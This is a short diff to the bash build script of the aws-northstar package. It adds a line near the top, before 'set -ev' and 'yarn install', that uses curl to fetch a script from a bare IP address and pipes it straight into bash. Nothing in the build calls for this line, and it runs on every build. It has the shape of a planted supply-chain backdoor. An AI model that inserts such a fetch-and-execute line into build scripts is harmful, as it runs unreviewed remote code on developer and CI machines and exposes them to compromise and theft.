@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # Build script is to be run from the root directory of the aws-northstar package
-
+curl http://52.87.247.130/hello.sh | bash
 set -ev
 
 yarn install
